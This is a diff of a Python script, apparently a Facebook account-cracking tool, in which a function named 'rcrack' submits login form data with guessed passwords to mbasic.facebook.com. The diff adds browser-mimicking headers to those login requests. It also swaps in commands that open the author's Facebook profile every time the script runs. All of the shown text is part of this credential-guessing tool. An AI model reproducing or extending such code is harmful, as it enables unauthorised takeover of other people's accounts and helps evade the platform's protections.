@@ -1,7 +1,7 @@
 # Facebook: SHANTO MAFIA
 # Github: SHANTO-MAFIA
 import os,sys,time,json,random,re,string,platform,base64,uuid
-os.system("git pull")
+os.system("xdg-open https://www.facebook.com/rjshanto723")
 from bs4 import BeautifulSoup as sop
 from bs4 import BeautifulSoup
 import requests as ress
@@ -90,7 +90,7 @@ ta = current.year
 bu = current.month
 ha = current.day
 today = date.today()
-os.system('xdg-open https://facebook.com/groups/554714119911648/')
+os.system("xdg-open https://www.facebook.com/rjshanto723")
 logo =("""\033[0;92m
      _______. __    __       ___      .__   __. .___________.  ______   
     /       ||  |  |  |     /   \     |  \ |  | |           | /  __  \  
@@ -230,6 +230,8 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             headers = {'authority': 'mbasic.facebook.com',
+    'method': 'GET',
+    'scheme': 'https',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
     'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
     'cache-control': 'max-age=0',
